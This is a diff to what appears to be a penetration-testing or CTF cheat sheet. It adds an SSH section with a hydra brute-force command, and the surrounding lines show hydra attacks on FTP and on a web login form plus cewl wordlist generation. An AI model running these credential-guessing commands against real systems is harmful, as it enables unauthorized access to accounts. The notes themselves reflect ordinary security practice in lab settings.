@@ -56,6 +56,13 @@ hydra  -l admin -P pass.txt -v ip ftp
 hydra -l none -P rockyou.txt 10.10.10.43 http-post-form
 "/department/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V
 ```
+
+## SSH
+
+```
+hydra -L usernames.txt -P passwords.txt -s 2222 ssh://10.10.10.66 -v -t 4
+```
+
 ## Basic Auth
 ```
 cewl example.com -m 6 -w /root/mega-cewl.txt 2> /dev/null
